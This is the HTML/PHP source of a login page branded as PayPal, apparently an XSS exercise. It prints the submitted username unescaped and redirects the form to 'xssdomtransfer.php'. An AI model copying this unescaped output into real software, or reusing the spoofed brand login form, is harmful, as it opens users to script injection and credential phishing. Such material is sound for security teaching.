<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1"><!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
        <meta name="description" content="">
        <meta name="author" content="">
        <link rel="icon" href="../../favicon.ico">
        <title>
            Paypal
        </title><!-- Bootstrap core CSS -->
        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css"><!-- Custom styles for this template -->
        <link href="cover.css" rel="stylesheet" type="text/css"><!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    </head>
    <body>

        <div class="site-wrapper">
            <div class="site-wrapper-inner">
                <div class="cover-container">
                    <div class="masthead clearfix">
                        <div class="inner">
                            <h3 class="masthead-brand">
                                <img src="paypal.png" height="150" width="200">
                            </h3>
                            <nav>
                                <ul class="nav masthead-nav"></ul>
                            </nav>
                        </div>
                    </div>
                    <div class="inner cover">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <font size="5" color="black">Login</font>
                            </div>
                            <div class="panel-body">
                                <?php var_dump($_POST['name']); ?>
                                <p class="text-left"></p>
                                <form action="" method="post" id="formly">
                                    <font size="5" color="black"><label for="inputEmail" class="sr-only">Username</label> <input id="name" name="name"  placeholder="Username" autofocus=""><br>
                                    <label class="sr-only">Password</label> <input type="password" name="password" id="password" class="form-control" placeholder="Password" required=""><br></font>
                                    <p class="lead"></p>
                             
                            </div>
                        </div>
<br>
                               <button type="submit" value=" Send" class="btn btn-lg btn-default" id="submit"><font size="5" color="black">Login</font></button></font>
                                </form>
<script type ="text/javascript">

if (proceedvalue == 1){


document.getElementById('formly').action="xssdomtransfer.php";
}
</script>


                    </div>
                    <div class="mastfoot">
                        <div class="inner"></div>
                    </div>
                </div>
            </div>
        </div><!-- Bootstrap core JavaScript
    ================================================== -->
        <!-- Placed at the end of the document so the pages load faster -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js" type="text/javascript">
</script><script src="js/bootstrap.min.js" type="text/javascript">
</script><!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
        <script src="js/ie10-viewport-bug-workaround.js" type="text/javascript">
</script>
    </body>
</html>